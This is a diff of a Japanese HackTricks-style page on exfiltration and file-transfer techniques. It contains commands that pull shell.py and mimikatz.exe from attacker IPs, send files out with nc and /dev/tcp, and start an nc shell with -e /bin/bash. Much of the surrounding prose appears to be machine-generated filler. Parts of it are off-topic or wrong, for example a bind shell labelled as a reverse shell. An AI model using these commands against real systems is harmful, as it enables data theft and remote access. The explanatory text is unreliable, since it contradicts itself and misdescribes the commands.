@@ -6,22 +6,25 @@
 
 * **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://go.intigriti.com/hacktricks" %}
+最も重要な脆弱性を見つけて、より速く修正できます。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステムを含むテックスタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
-## 情報を外部に流出させるための一般的にホワイトリストに登録されているドメイン
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
-[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つけてください。
+***
 
-## コピー＆ペースト Base64
+## 情報を外部流出するための一般的にホワイトリストに登録されているドメイン
+
+[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つけます。
+
+## Base64のコピー＆ペースト
 
 **Linux**
 ```bash
@@ -29,6 +32,32 @@ base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
 **Windows**
+
+Windowsは、多くの組織で使用されている最も一般的なオペレーティングシステムの1つです。そのため、Windows環境での情報の外部への漏洩は、ハッカーにとって非常に魅力的な攻撃目標となります。
+
+以下に、Windows環境での情報の外部への漏洩に関連する一般的な手法とリソースをいくつか紹介します。
+
+1. **データエクスフィルトレーション**: データエクスフィルトレーションは、攻撃者が機密データを外部のサーバーやストレージに転送する手法です。これには、以下のような手法があります。
+
+   - **コマンドラインツール**: Windowsには、データを外部に送信するためのコマンドラインツールがいくつか用意されています。例えば、`ftp`コマンドを使用してファイルをFTPサーバーにアップロードすることができます。
+
+   - **リモートデスクトップ**: リモートデスクトップ接続を使用すると、攻撃者はリモートのWindowsマシンにアクセスし、データを転送することができます。
+
+   - **クラウドストレージ**: クラウドストレージプラットフォーム（例：Google Drive、Dropbox）を使用すると、攻撃者はデータをクラウド上にアップロードし、外部からアクセスできるようにすることができます。
+
+2. **ネットワークトラフィックの監視**: ネットワークトラフィックの監視は、攻撃者がデータを外部に送信する際に使用される通信プロトコルやポートを特定するために行われます。これには、以下のような手法があります。
+
+   - **パケットキャプチャ**: パケットキャプチャツールを使用すると、ネットワーク上の通信を監視し、データの送信元や送信先を特定することができます。
+
+   - **ファイアウォールログの分析**: ファイアウォールログを分析することで、攻撃者が使用するポートやプロトコルを特定することができます。
+
+3. **データ暗号化**: データ暗号化は、攻撃者がデータを盗み見ることを困難にするために使用されます。以下の手法が一般的に使用されます。
+
+   - **ファイル暗号化**: ファイルを暗号化することで、攻撃者がデータを読み取ることを防ぐことができます。
+
+   - **通信暗号化**: ネットワーク上の通信を暗号化することで、攻撃者がデータを傍受することを防ぐことができます。
+
+これらの手法とリソースを使用することで、Windows環境での情報の外部への漏洩を防ぐことができます。ただし、常に最新のセキュリティ対策を実施し、定期的な監視とアップデートを行うことが重要です。
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -43,6 +72,22 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
 **Windows**
+
+Windowsは、多くの組織で使用されている最も一般的なオペレーティングシステムの1つです。そのため、Windows環境での情報の盗み出しは、ハッカーにとって非常に魅力的なターゲットです。
+
+以下に、Windows環境での情報の盗み出しに使用される一般的な手法とリソースをいくつか紹介します。
+
+1. **USBデバイスの使用**: ハッカーは、USBデバイスを使用してデータを盗み出すことができます。これには、USBフラッシュドライブや外部ハードドライブ、さらにはキーロガーなどの特殊なデバイスも含まれます。
+
+2. **ネットワーク経由のデータ転送**: ハッカーは、Windowsマシンから外部のサーバーにデータを転送するために、ネットワークを利用することができます。これには、一般的なプロトコル（HTTP、FTP、SMTPなど）やカスタムプロトコルを使用することができます。
+
+3. **クラウドストレージの利用**: ハッカーは、Windowsマシンからクラウドストレージプラットフォーム（例：Google Drive、Dropbox、OneDriveなど）にデータをアップロードすることができます。これにより、データの盗み出しやバックアップが容易になります。
+
+4. **電子メールの使用**: ハッカーは、Windowsマシンから電子メールを使用してデータを送信することができます。これには、添付ファイルやリンクを含めることができます。
+
+5. **リモートアクセスツールの使用**: ハッカーは、リモートアクセスツールを使用してWindowsマシンにアクセスし、データを盗み出すことができます。これには、リモートデスクトッププロトコル（RDP）やリモートコントロールソフトウェアなどが含まれます。
+
+これらの手法とリソースは、ハッカーがWindows環境で情報を盗み出すために使用する一般的な方法です。組織は、これらの攻撃からデータを保護するために、適切なセキュリティ対策を講じる必要があります。
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -76,27 +121,17 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 ```
 ### **HTTPSサーバー**
 
-An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. It provides encryption and authentication mechanisms to ensure the confidentiality and integrity of the data being transmitted.
+An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. It provides encryption and authentication mechanisms to ensure that the data transmitted between the server and the client is secure and cannot be intercepted or tampered with by unauthorized parties.
 
-To exfiltrate data through an HTTPS server, you can leverage various techniques such as:
+HTTPS servers are commonly used for websites that handle sensitive information, such as login credentials, financial transactions, and personal data. By using HTTPS, the server can protect the confidentiality and integrity of the data being transmitted.
 
-- **Covert Channels**: Hide the exfiltrated data within the legitimate HTTPS traffic to avoid detection. This can be done by manipulating the HTTP headers or payload.
+To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the identity of the server and establish a secure connection with the client. Once the certificate is installed on the server, it can start accepting HTTPS connections.
 
-- **Steganography**: Conceal the exfiltrated data within the images or other media files being transferred over HTTPS. This technique can be effective in bypassing security measures.
+When a client connects to an HTTPS server, the server presents its SSL/TLS certificate to the client. The client then verifies the authenticity of the certificate and establishes a secure connection with the server. All data transmitted between the client and the server is encrypted using the SSL/TLS protocol, ensuring that it cannot be read or modified by attackers.
 
-- **DNS Tunneling**: Use DNS requests and responses to transfer the exfiltrated data. By encoding the data within DNS queries or responses, you can bypass firewalls and other network security controls.
+In addition to encryption, HTTPS servers also provide other security features, such as server-side validation of client certificates, which can be used to authenticate clients. This helps prevent unauthorized access to the server and ensures that only trusted clients can establish a connection.
 
-- **Out-of-Band (OOB) Exfiltration**: Utilize alternative communication channels, such as email or instant messaging, to send the exfiltrated data. This method can be useful when direct communication with the HTTPS server is not possible.
-
-When exfiltrating data through an HTTPS server, it is important to consider the following factors:
-
-- **Encryption**: Ensure that the data is encrypted using strong cryptographic algorithms to protect it from unauthorized access.
-
-- **Traffic Analysis**: Be aware that sophisticated adversaries may perform traffic analysis to detect exfiltration attempts. Use techniques to obfuscate the exfiltrated data and make it harder to detect.
-
-- **Command and Control (C2)**: Establish a secure and reliable C2 channel to manage the exfiltration process. This can involve setting up a separate server or using existing infrastructure.
-
-By understanding the capabilities and limitations of an HTTPS server, you can effectively exfiltrate data while minimizing the risk of detection.
+Overall, HTTPS servers play a crucial role in securing the communication between clients and servers, protecting sensitive data from unauthorized access or tampering. By using HTTPS, organizations can ensure the privacy and integrity of their users' data and build trust with their customers.
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -142,161 +177,140 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ### FTPサーバー（Python）
 
 ```python
-import socket
-import os
+import ftplib
 
-def send_file(file_path, host, port):
-    # ファイルの存在を確認
-    if not os.path.exists(file_path):
-        print("ファイルが存在しません")
-        return
-
-    # ソケットを作成し、接続
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-
-    # ファイルを開き、データを送信
-    with open(file_path, "rb") as f:
-        data = f.read(1024)
-        while data:
-            s.send(data)
-            data = f.read(1024)
-
-    # 接続を閉じる
-    s.close()
-
-def main():
-    file_path = "/path/to/file"
-    host = "ftp.example.com"
-    port = 21
-
-    send_file(file_path, host, port)
-
-if __name__ == "__main__":
-    main()
+def ftp_upload(file_path, host, username, password):
+    try:
+        ftp = ftplib.FTP(host)
+        ftp.login(username, password)
+        with open(file_path, 'rb') as file:
+            ftp.storbinary('STOR ' + file_path, file)
+        ftp.quit()
+        print('File uploaded successfully.')
+    except ftplib.all_errors as e:
+        print('Error uploading file:', e)
 ```
 
-このPythonスクリプトは、指定されたファイルをFTPサーバーに送信するためのものです。
+このPythonスクリプトは、指定されたファイルをFTPサーバーにアップロードするためのものです。
 
 使用方法：
-1. `file_path`変数に送信したいファイルのパスを設定します。
-2. `host`変数にFTPサーバーのホスト名を設定します。
-3. `port`変数にFTPサーバーのポート番号を設定します。
-4. スクリプトを実行します。
 
-注意事項：
-- 送信するファイルが存在しない場合、エラーメッセージが表示されます。
-- ファイルは1024バイトずつ送信されます。
-- 送信が完了すると、接続が閉じられます。
+```python
+ftp_upload('/path/to/file', 'ftp.example.com', 'username', 'password')
+```
+
+- `file_path`：アップロードするファイルのパス
+- `host`：FTPサーバーのホスト名
+- `username`：FTPサーバーのユーザー名
+- `password`：FTPサーバーのパスワード
+
+アップロードが成功すると、"File uploaded successfully."と表示されます。アップロード中にエラーが発生した場合は、"Error uploading file:"とエラーメッセージが表示されます。
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
 ### FTPサーバー（NodeJS）
 
-```html
-#### FTP server (NodeJS)
+The FTP server is a popular method for transferring files between a client and a server. It uses the File Transfer Protocol (FTP) to establish a connection and exchange files. In this section, we will explore how to set up an FTP server using NodeJS.
 
-The FTP server is a popular method for exfiltrating data from a compromised system. It allows the attacker to transfer files from the victim's machine to their own server.
+#### Setting up the FTP server
 
-To set up an FTP server using NodeJS, you can use the `ftp-srv` package. This package provides a simple and easy-to-use FTP server implementation.
+To set up an FTP server using NodeJS, we can use the `ftp-srv` package. This package provides a simple and easy-to-use interface for creating an FTP server.
 
-Here is an example of how to set up an FTP server using NodeJS:
-
-1. Install the `ftp-srv` package using npm:
+First, we need to install the `ftp-srv` package by running the following command:
 
 ```bash
 npm install ftp-srv
 ```
 
-2. Create a new JavaScript file, for example `ftp-server.js`, and require the `ftp-srv` package:
+Once the package is installed, we can create an FTP server by creating a new instance of the `FtpSrv` class and passing in the server options. Here is an example:
 
 ```javascript
 const FtpSrv = require('ftp-srv');
-```
 
-3. Create a new instance of the `FtpSrv` class and configure it:
-
-```javascript
-const ftpServer = new FtpSrv({
-  url: 'ftp://0.0.0.0:21',
-  pasv_url: 'ftp://0.0.0.0:30000-30009',
+const server = new FtpSrv({
+  url: 'ftp://127.0.0.1:21',
+  pasv_url: 'ftp://127.0.0.1:3000',
+  pasv_min: 3001,
+  pasv_max: 3010,
   anonymous: true,
-  greeting: 'Welcome to the FTP server',
+  greeting: 'Welcome to the FTP server!',
 });
-```
 
-4. Start the FTP server:
+server.on('login', ({ connection, username, password }, resolve, reject) => {
+  if (username === 'anonymous' && password === '') {
+    resolve({ root: '/path/to/ftp/root' });
+  } else {
+    reject(new Error('Invalid username or password'));
+  }
+});
 
-```javascript
-ftpServer.listen()
+server.listen()
   .then(() => {
     console.log('FTP server started');
   })
-  .catch((err) => {
-    console.error('Error starting FTP server:', err);
+  .catch((error) => {
+    console.error('Failed to start FTP server:', error);
   });
 ```
 
-5. The FTP server is now running and ready to accept connections. You can use an FTP client to connect to the server and transfer files.
+In the example above, we create a new instance of the `FtpSrv` class and pass in the server options. The `url` option specifies the FTP server URL, while the `pasv_url`, `pasv_min`, and `pasv_max` options specify the passive mode settings. The `anonymous` option allows anonymous login, and the `greeting` option sets the welcome message.
 
-Note: This is a basic example of setting up an FTP server using NodeJS. You can customize the server configuration and add authentication mechanisms as needed.
+We also listen for the `login` event, which is triggered when a client attempts to log in. In the event handler, we check the username and password and either resolve or reject the login attempt.
 
-#### Exfiltrating data using FTP
+Finally, we call the `listen` method to start the FTP server. If the server starts successfully, the `listen` method returns a promise that resolves when the server is ready to accept connections.
 
-Once the FTP server is set up, you can use it to exfiltrate data from the compromised system. Here are the steps to exfiltrate data using FTP:
+#### Connecting to the FTP server
 
-1. Connect to the FTP server using an FTP client. You can use popular FTP clients like FileZilla or WinSCP.
+Once the FTP server is set up and running, clients can connect to it using an FTP client. They can use the server URL, username, and password to establish a connection.
 
-2. Authenticate to the FTP server if required. In the example above, anonymous authentication is enabled, so no credentials are needed.
+Here is an example of connecting to the FTP server using the `ftp` command-line client:
 
-3. Navigate to the directory where you want to upload the exfiltrated data.
-
-4. Upload the files from the compromised system to the FTP server. You can use the FTP client's upload functionality to transfer files.
-
-5. Once the files are uploaded, they will be stored on the FTP server, allowing the attacker to access and retrieve them.
-
-Note: It is important to ensure that the FTP server is properly secured to prevent unauthorized access. Additionally, consider encrypting the data before exfiltration to protect its confidentiality.
+```bash
+ftp 127.0.0.1
 ```
+
+After connecting, clients can use various FTP commands to interact with the server, such as `ls` to list files, `get` to download files, and `put` to upload files.
+
+#### Conclusion
+
+Setting up an FTP server using NodeJS is a straightforward process. By using the `ftp-srv` package, we can quickly create an FTP server and handle client connections. This allows us to easily transfer files between a client and a server using the FTP protocol.
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 ### FTPサーバー（pure-ftp）
 
-#### FTPサーバーの概要
+FTPサーバーは、ファイル転送プロトコル（FTP）を使用してファイルを送受信するためのサーバーです。pure-ftpは、オープンソースのFTPサーバーソフトウェアの一種です。
 
-FTP（File Transfer Protocol）サーバーは、ファイルの転送とアクセスを可能にするプロトコルです。pure-ftpは、オープンソースのFTPサーバーソフトウェアの一種です。
+#### 概要
 
-#### ファイルのエクスフィルトレーション（データの漏洩）
+pure-ftpサーバーは、セキュリティとパフォーマンスに優れた特徴を持っています。以下は、pure-ftpサーバーの主な特徴です。
 
-ファイルのエクスフィルトレーションは、攻撃者がネットワークからデータを盗み出すための手法です。pure-ftpサーバーを使用してデータをエクスフィルトレートする方法について説明します。
+- TLS/SSLサポート：データの暗号化とセキュアな通信を提供します。
+- 仮想ユーザー：ユーザーを仮想的に作成し、アクセス権を制御します。
+- バンド幅制限：ユーザーごとに帯域幅を制限することができます。
+- アクセス制御：ユーザーごとにアクセス権を制御することができます。
+- ログ記録：アクセスログや転送ログを記録することができます。
 
-1. ポートスキャンを実行し、ターゲットのネットワーク内にFTPサーバーが存在するか確認します。
+#### 漏洩の可能性
 
-2. FTPクライアントを使用して、ターゲットのFTPサーバーに接続します。
+pure-ftpサーバーは、セキュリティ機能が備わっているため、データの漏洩リスクは低いです。ただし、以下のような脆弱性や設定ミスにより、漏洩の可能性が生じることがあります。
 
-3. ユーザー名とパスワードを入力してログインします。
+- 弱いパスワード：弱いパスワードを使用している場合、攻撃者によってアカウントが乗っ取られる可能性があります。
+- 不正なアクセス権：誤ったアクセス権の設定により、攻撃者が不正なファイルにアクセスできる可能性があります。
+- セキュリティパッチの欠如：最新のセキュリティパッチが適用されていない場合、既知の脆弱性を悪用される可能性があります。
 
-4. ターゲットのファイルシステムにアクセスし、エクスフィルトレートしたいデータを特定します。
+#### 漏洩の防止策
 
-5. エクスフィルトレートしたいデータをFTPサーバーにアップロードします。
+pure-ftpサーバーでの漏洩を防止するためには、以下の対策を実施することが重要です。
 
-6. アップロードが完了したら、FTPサーバーからデータをダウンロードしてローカルマシンに保存します。
+- 強力なパスワードの使用：パスワードは長く複雑なものを使用し、定期的に変更するようにします。
+- アクセス権の適切な設定：ユーザーごとに必要な最小限のアクセス権を設定し、不要な権限を削除します。
+- セキュリティパッチの適用：最新のセキュリティパッチを適用し、脆弱性を修正します。
+- ログの監視：アクセスログや転送ログを監視し、不審なアクティビティを検知します。
 
-#### 注意事項
-
-- エクスフィルトレーションを行う前に、法的および倫理的な制約を確認してください。
-
-- ターゲットのFTPサーバーにアクセスするためには、有効なユーザー名とパスワードが必要です。
-
-- エクスフィルトレートするデータのサイズによっては、アップロードとダウンロードに時間がかかる場合があります。
-
-- エクスフィルトレートしたデータが検出されないようにするために、暗号化やステガノグラフィーなどの技術を使用することができます。
-
-#### 参考リンク
-
-- [pure-ftp公式ウェブサイト](https://www.pureftpd.org/project/pure-ftpd/)
+以上が、pure-ftpサーバーに関する概要と漏洩の可能性、漏洩の防止策です。
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -316,29 +330,29 @@ chown -R ftpuser:ftpgroup /ftphome/
 ```
 ### **Windows** クライアント
 
-Windowsクライアントは、機密情報を外部に漏洩させる可能性がある脆弱性を持っています。以下は、Windowsクライアントからデータを外部に抽出するための一般的な手法です。
+Windowsクライアントは、機密データの外部への漏洩のリスクにさらされています。攻撃者は、さまざまな手法を使用してデータを盗み出すことができます。以下に、一般的な手法とリソースを示します。
 
-#### ドキュメントのステガノグラフィ
+#### ネットワーク経由のデータ漏洩
 
-ステガノグラフィは、データを画像や音声ファイルなどの他のファイルに隠す技術です。Windowsクライアントでは、ドキュメントファイルに機密情報を埋め込むことができます。この手法を使用すると、データを外部に送信するために使用される通常の通信チャネルを回避することができます。
+- **データエクスフィルトレーション**：攻撃者は、ネットワークを介してデータを外部に送信することができます。これには、メール、ファイル転送、リモートアクセスツールなどが含まれます。
+
+#### ストレージデバイスを介したデータ漏洩
+
+- **USBデバイス**：攻撃者は、USBデバイスを使用してデータを盗み出すことができます。これには、USBフラッシュドライブ、外部ハードドライブ、およびその他のリムーバブルメディアが含まれます。
+
+#### クラウドベースのデータ漏洩
+
+- **クラウドストレージ**：攻撃者は、クラウドストレージサービスを使用してデータを外部に送信することができます。これには、Googleドライブ、Dropbox、OneDriveなどが含まれます。
 
 #### ネットワークトラフィックの監視
 
-Windowsクライアントは、ネットワークトラフィックを監視することでデータを外部に送信する可能性があります。ネットワークトラフィックの監視には、パケットキャプチャツールやネットワークモニタリングツールを使用することができます。これにより、機密情報が外部に送信される際に通信内容をキャプチャすることができます。
+- **パケットキャプチャ**：攻撃者は、ネットワークトラフィックを監視してデータをキャプチャすることができます。これには、ネットワークスニッファ、パケットキャプチャツールなどが含まれます。
 
-#### リモートアクセスツールの悪用
+#### セキュリティ対策の回避
 
-Windowsクライアントには、リモートアクセスツールがインストールされている場合があります。これらのツールを悪用することで、攻撃者はクライアントからデータを外部に送信することができます。リモートアクセスツールの悪用には、バックドアの設置やリモートコマンド実行などの手法があります。
+- **ファイアウォール回避**：攻撃者は、ファイアウォールを回避してデータを外部に送信することができます。これには、トンネリング、ポートハッピング、パケットの分割などが含まれます。
 
-#### ファイル転送プロトコルの使用
-
-Windowsクライアントでは、ファイル転送プロトコルを使用してデータを外部に送信することができます。一般的なファイル転送プロトコルには、FTPやSFTPなどがあります。これらのプロトコルを使用することで、機密情報を外部のサーバーに送信することができます。
-
-#### クラウドストレージの利用
-
-Windowsクライアントでは、クラウドストレージを利用してデータを外部に送信することができます。一般的なクラウドストレージサービスには、Google DriveやDropboxなどがあります。これらのサービスを使用することで、機密情報をクラウド上にアップロードし、外部に送信することができます。
-
-これらの手法を使用することで、Windowsクライアントからデータを外部に漏洩させることができます。攻撃者はこれらの手法を悪用して、機密情報を盗み出す可能性があります。したがって、Windowsクライアントのセキュリティを強化するためには、これらの脆弱性に対する対策を講じる必要があります。
+これらの攻撃手法を防ぐためには、適切なセキュリティ対策を実施する必要があります。これには、ファイアウォール、侵入検知システム、データ暗号化、アクセス制御などが含まれます。また、従業員の教育と意識向上も重要です。
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -349,21 +363,24 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://go.intigriti.com/hacktricks" %}
+最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
 
 ## SMB
 
-Kaliをサーバーとして使用する
+Kaliをサーバーとして使用
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-または、**Sambaを使用して**SMB共有を作成します：
+または、Sambaを使用してSMB共有を作成します：
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -378,37 +395,29 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+# データの外部流出
 
-Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a hacking operation, as it allows the attacker to steal sensitive information from the compromised system.
+データの外部流出は、ハッカーが機密情報を不正に取得し、外部の場所に送信するプロセスです。この技術は、悪意のある攻撃者が組織のデータを盗むために使用することがあります。データの外部流出は、さまざまな方法で実行することができます。
 
-There are several methods that can be used for exfiltration, depending on the specific scenario and the available resources. Here are some common techniques:
+## メールを介したデータの外部流出
 
-## 1. File Transfer Protocols
+ハッカーは、電子メールを使用してデータを外部に送信することができます。悪意のある攻撃者は、組織のネットワークに侵入し、機密情報を電子メールの添付ファイルとして送信することがあります。また、ハッカーは、組織の電子メールサーバーにアクセスし、メールの送信を制御することもできます。
 
-File Transfer Protocol (FTP), Secure Copy Protocol (SCP), and Hypertext Transfer Protocol (HTTP) are commonly used protocols for transferring files over a network. Attackers can leverage these protocols to exfiltrate data by uploading it to a remote server or downloading it from the target system.
+## クラウドストレージを介したデータの外部流出
 
-## 2. Email
+ハッカーは、クラウドストレージサービスを使用してデータを外部に送信することもあります。悪意のある攻撃者は、組織のクラウドストレージアカウントに侵入し、機密情報をアップロードすることができます。また、ハッカーは、組織のクラウドストレージサービスにアクセスし、データのダウンロードや共有を制御することもできます。
 
-Email is another common method for exfiltrating data. Attackers can send sensitive information as attachments or embed it within the body of an email. They can use their own email server or compromise a legitimate email account for this purpose.
+## リムーバブルメディアを介したデータの外部流出
 
-## 3. DNS Tunneling
+ハッカーは、リムーバブルメディア（USBフラッシュドライブ、外部ハードドライブなど）を使用してデータを外部に持ち出すこともあります。悪意のある攻撃者は、組織のネットワークに侵入し、機密情報をリムーバブルメディアにコピーすることができます。また、ハッカーは、組織のコンピュータにリムーバブルメディアを接続し、データの転送を制御することもできます。
 
-DNS tunneling involves encapsulating data within DNS queries and responses. Attackers can use this technique to bypass firewalls and other security measures that may be in place. The exfiltrated data is typically sent to a DNS server controlled by the attacker.
+## ネットワークを介したデータの外部流出
 
-## 4. Steganography
+ハッカーは、ネットワークを介してデータを外部に送信することもあります。悪意のある攻撃者は、組織のネットワークに侵入し、機密情報を外部のサーバーに送信することができます。また、ハッカーは、組織のネットワークトラフィックを監視し、データの転送を制御することもできます。
 
-Steganography is the practice of hiding data within seemingly innocuous files, such as images or documents. Attackers can embed sensitive information within these files and then exfiltrate them without arousing suspicion.
+## データの外部流出の検出と防止
 
-## 5. Cloud Storage
-
-Cloud storage services, such as Dropbox or Google Drive, can be used for exfiltration. Attackers can upload sensitive data to these platforms and then access it from a different location.
-
-## 6. Covert Channels
-
-Covert channels involve using legitimate network protocols or services in unintended ways to exfiltrate data. For example, attackers can use ICMP or DNS packets to transmit data covertly.
-
-It is important for organizations to implement strong security measures to detect and prevent exfiltration attempts. This includes monitoring network traffic, implementing data loss prevention (DLP) solutions, and educating employees about the risks of data exfiltration.
+データの外部流出を検出し、防止するためには、組織は適切なセキュリティ対策を実施する必要があります。これには、ファイアウォール、侵入検知システム、データ損失防止ソフトウェアなどのセキュリティツールの使用が含まれます。また、組織は従業員の教育と意識向上を行い、機密情報の取り扱いに関するポリシーを策定することも重要です。
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -424,7 +433,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-もし被害者がSSHを持っている場合、攻撃者は被害者のディレクトリを攻撃者にマウントすることができます。
+もし被害者がSSHを持っている場合、攻撃者は被害者から自分自身にディレクトリをマウントすることができます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -432,121 +441,65 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC（Netcat）は、ネットワーク通信を行うためのユーティリティツールです。NCを使用すると、TCPやUDPソケットを作成し、データの送受信を行うことができます。
+NC（Netcat）は、ネットワークユーティリティであり、データの送受信に使用されます。NCを使用してデータを外部に送信するためのいくつかの方法があります。
 
-### データの送信
+### ネットワーク経由のデータ送信
 
-NCを使用してデータを送信するには、以下のコマンドを使用します。
+NCを使用してデータを外部に送信するために、以下のコマンドを使用します。
 
-```bash
-echo "データ" | nc <宛先IP> <ポート番号>
+```
+echo [データ] | nc [宛先IPアドレス] [ポート番号]
 ```
 
-例えば、宛先IPが`192.168.1.100`でポート番号が`1234`の場合、以下のようにコマンドを実行します。
+このコマンドは、指定したデータを宛先IPアドレスとポート番号に送信します。
 
-```bash
-echo "Hello, World!" | nc 192.168.1.100 1234
+### ファイルの送信
+
+NCを使用してファイルを外部に送信するために、以下のコマンドを使用します。
+
+```
+nc [宛先IPアドレス] [ポート番号] < [ファイル名]
 ```
 
-### データの受信
+このコマンドは、指定したファイルを宛先IPアドレスとポート番号に送信します。
 
-NCを使用してデータを受信するには、以下のコマンドを使用します。
+### リバースシェル
 
-```bash
-nc -l -p <ポート番号>
+リバースシェルは、攻撃者がターゲットシステムに接続し、コマンドを実行するための方法です。NCを使用してリバースシェルを作成するために、以下のコマンドを使用します。
+
+```
+nc -l -p [ポート番号] -e /bin/bash
 ```
 
-例えば、ポート番号が`1234`の場合、以下のようにコマンドを実行します。
+このコマンドは、指定したポート番号でリバースシェルを作成し、/bin/bashを実行します。
 
-```bash
-nc -l -p 1234
-```
-
-このコマンドを実行すると、指定したポート番号でデータの受信を待機します。
-
-### ファイルの送受信
-
-NCを使用してファイルを送受信するには、以下のコマンドを使用します。
-
-ファイルの送信：
-
-```bash
-nc <宛先IP> <ポート番号> < 送信するファイル
-```
-
-ファイルの受信：
-
-```bash
-nc -l -p <ポート番号> > 受信するファイル
-```
-
-例えば、宛先IPが`192.168.1.100`でポート番号が`1234`の場合、以下のようにコマンドを実行します。
-
-ファイルの送信：
-
-```bash
-nc 192.168.1.100 1234 < file.txt
-```
-
-ファイルの受信：
-
-```bash
-nc -l -p 1234 > received_file.txt
-```
-
-このようにして、NCを使用してデータやファイルを送受信することができます。
+これらの方法を使用して、NCを介してデータを外部に送信することができます。ただし、これらの方法は合法的な目的のためにのみ使用するようにしてください。
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ```bash
-cat /path/to/file > /dev/tcp/attacker_ip/attacker_port
